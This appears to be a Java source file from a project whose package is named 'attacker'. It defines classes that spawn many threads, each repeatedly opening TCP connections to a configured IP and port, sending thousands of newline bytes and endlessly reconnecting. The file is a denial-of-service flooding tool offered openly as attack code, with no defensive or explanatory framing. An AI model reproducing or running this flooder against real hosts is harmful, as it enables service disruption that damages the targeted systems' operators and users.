/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package core.components.attacker;

import static core.components.attacker.AttackerTwo.i;
import core.management.CoreConfiguration;
import core.management.CoreProperties;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.util.Random;

/**
 *
 * @author miguel
 */
public class AttackerOne implements Runnable {

    public String ip;
    public int port;
    private Socket socket;
    private CoreProperties prop;
    public byte[] payload;
    private Random rand;
    int threads;
    Attack[] attack;

    public AttackerOne(int threads) {
        this.ip = prop.ip;
        this.port = prop.destiny_port;
        this.payload = new byte[prop.payload];
        this.rand = new Random();
        rand.nextBytes(payload);
        this.threads = threads;
        attack = new Attack[threads];
        for (int j = 0; j < threads; j++) {
            attack[j] = new Attack();
        }
    }

    @Override
    public void run() {
        for (int j = 0; j < threads; j++) {
            new Thread(attack[j]).start();
        }
    }
}

class Attack implements Runnable {

    public Attack() {
        System.out.println("Execution=" + i++);
    }

    @Override
    public void run() {
        Socket socket = null;
        DataOutputStream out = null;
        try {
            socket = new Socket(CoreProperties.ip, CoreProperties.destiny_port);
            out = new DataOutputStream(socket.getOutputStream());
            CoreConfiguration.print("Connected to=" + CoreProperties.ip + ":" + CoreProperties.destiny_port);
            int k = 0;
            while (true) {
                out.write(new byte[]{10});
                out.flush();
                k++;
                if (k == 5000) {
                    break;
                }
            }
            if (socket != null) {
                if (out != null) {
                    out.close();
                }
                socket.close();
            }
            new Attack().run();
        } catch (Exception ex) {
            try {
                if (socket != null) {
                    if (out != null) {
                        out.close();
                    }
                    socket.close();
                }
                new Attack().run();
            } catch (IOException ex1) {
                new Attack().run();
                System.out.println("Execption::: " + ex1.getMessage());
            }
        }
    }
}
